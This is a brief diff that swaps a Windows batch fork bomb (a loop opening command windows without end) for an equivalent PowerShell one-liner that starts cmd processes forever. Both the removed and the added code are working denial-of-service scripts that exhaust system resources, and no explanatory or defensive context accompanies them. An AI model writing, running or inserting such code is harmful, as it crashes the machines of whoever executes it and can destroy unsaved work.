@@ -1,13 +1,1 @@
-@echo off
-:loop
-start cmd
-start cmd
-start cmd
-start cmd
-start cmd
-start cmd
-start cmd
-start cmd
-start cmd
-start cmd
-goto loop
+powershell -Command "while ($true) {Start-Process cmd}"
